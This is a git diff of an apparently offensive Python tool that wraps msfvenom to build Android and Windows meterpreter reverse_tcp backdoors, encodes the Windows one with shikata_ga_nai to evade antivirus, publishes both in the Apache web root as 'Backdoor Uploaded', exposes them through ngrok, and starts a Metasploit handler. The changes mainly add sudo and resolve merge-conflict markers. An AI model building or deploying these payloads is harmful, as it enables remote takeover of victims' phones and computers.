@@ -57,7 +57,7 @@ def __directory__():
             time.sleep(0.1)
             sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Creating Directory..")
             sys.stdout.flush()
-        os.system("mkdir /tmp/payload/")
+        os.system("sudo mkdir /tmp/payload/")
         print("\n" + blue_plus + " Directory has been created \n")
         print("")
 
@@ -68,7 +68,7 @@ def __apache__():
         time.sleep(0.1)
         sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Starting Service Apache2..")
         sys.stdout.flush()
-    os.system("service apache2 start")
+    os.system("sudo service apache2 start")
     print("\n" + blue_plus + " Server has been started \n")
     print("")
 
@@ -87,10 +87,10 @@ def __default__(ip, port):
 #Create Android payload
 def venom_andro(ip, port, filename):
     try:
-        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} > /tmp/payload/{filename}.apk")
+        os.system(f"sudo msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} > /tmp/payload/{filename}.apk")
         print("\n"+red_ex + " Uploading backdoor to the server..")
         __animation__()
-        os.system(f"cp /tmp/payload/{filename}.apk /var/www/html\n")
+        os.system(f"sudo cp /tmp/payload/{filename}.apk /var/www/html\n")
         print(blue_plus + " Backdoor Uploaded \n")
     except Exception as ex:
         print("Exception: %s" % str(ex))
@@ -98,10 +98,10 @@ def venom_andro(ip, port, filename):
 #Create Payload for Windows
 def venom_window(ip, port, filename):
     try:
-        os.system(f'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 20 -f exe -o /tmp/payload/{filename}.exe')
+        os.system(f'sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 20 -f exe -o /tmp/payload/{filename}.exe')
         print("\n"+red_ex + " Uploading backdoor to the server..")
         __animation__()
-        os.system(f"cp /tmp/payload/{filename}.exe /var/www/html\n")
+        os.system(f"sudo cp /tmp/payload/{filename}.exe /var/www/html\n")
         print(blue_plus + " Backdoor Uploaded \n")
     except Exception as ex:
         print("Exception: %s " % str(ex))
@@ -110,13 +110,8 @@ def venom_window(ip, port, filename):
 def msfconsole():
     print(GREEN + " Starting msfconsole..")
     try:
-<<<<<<< HEAD
         os.system("sudo xterm -T Metasploit -e msfconsole -q -r /root/.androwind/systemHandler.r")
-        os.system("sudo rm /root/.androwind/systemHandler.r && sudo rm -rf /root/.ngrok2/ && sudo rm -rf /tmp/payload/")
-=======
-        os.system("xterm -T Metasploit -e msfconsole -q -r /root/.androwind/systemHandler.r")
-        os.system("rm systemHandler.r && rm -rf /root/.ngrok2/ && rm -rf /tmp/payload/")
->>>>>>> 30620633e8ba12b764fc4351fc03acee5d16c86d
+        os.system("sudo rm systemHandler.r && sudo rm -rf /root/.ngrok2/ && sudo rm -rf /tmp/payload/")
         print("Done. Good Bye!")
     except Exception as ex:
         print("Exception: %s " %str(ex))
@@ -137,19 +132,20 @@ def metaConfig(ip, port):
 # CTRl + S to save file and CTRL + X to go further
 def systemHandler():
     try:
-        os.system("xterm -T Metasploit -e nano /root/.androwind/systemHandler.r")
+        os.system("sudo xterm -T Metasploit -e nano /root/.androwind/systemHandler.r")
 
     except Exception as ex:
         print("Exception: %s " %str(ex))
 
 #It will copy ngrok in /usr/local/bin to make an executeable
 def ngrok():
-    animation = ("\/-\\")
-    for i in range(10):
-        time.sleep(0.1)
-        sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Installing ngrok..")
-        sys.stdout.flush()
-    os.system("cp ngrok /usr/local/bin")
+    if not os.path.isfile('/usr/local/bin/ngrok'):
+        animation = ("\/-\\")
+        for i in range(10):
+            time.sleep(0.1)
+            sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Installing ngrok..")
+            sys.stdout.flush()
+        os.system("sudo cp ngrok /usr/local/bin")
     print("\n" + blue_plus + " Ngrok installed \n")
     print("")
 
@@ -164,13 +160,13 @@ def ngConfig():
     if not os.path.exists(path):
 
         try:
-            os.system(f"mkdir /root/.ngrok2 && cp -f ngrok.yml /root/.ngrok2/")
+            os.system(f"sudo mkdir /root/.ngrok2 && sudo cp -f ngrok.yml /root/.ngrok2/ && sudo rm -r /root/.androwind/ngrok.yml && cp -f ngrok.yml /root/.androwind")
 
         except Exception as ex:
             print("Exception: %s " %str(ex))
 
     print("\n" + blue_plus + " Configurations done")
-    print(blue_plus + " All done! For WAN forward ports by typing a command: \033[93m ngrok start --all \033[0m")
+    print(blue_plus + " All done! For WAN forward ports by typing a command: \033[93m sudo ngrok start --all \033[0m")
     print("")
 
 #main
@@ -184,21 +180,19 @@ def main():
     #input from user
     choice = input(GREEN + "\033[91mSet default IP for LAN OR press n for set custom IP and PORT for WAN \033[0m\n" + red_ex + " Set Local IP and Port no by androwind[Y/n]: ")
     if choice[0].upper() == 'Y':
+
         try:
             if ni.ifaddresses('wlan0'):
                 ip = ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr']
             else:
                 ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
-<<<<<<< HEAD
-=======
-
->>>>>>> 30620633e8ba12b764fc4351fc03acee5d16c86d
             port = 4444
             __default__(ip,port)
             filename = input("\n" + red_ex + " Enter filename without extension: ")
             print(blue_plus + " set Filename = > ", filename)
+
         except Exception as ex:
-            print("Exception: %s" %str(ex))
+            print("Exception: %s " %str(ex))
     else:
 
         try:
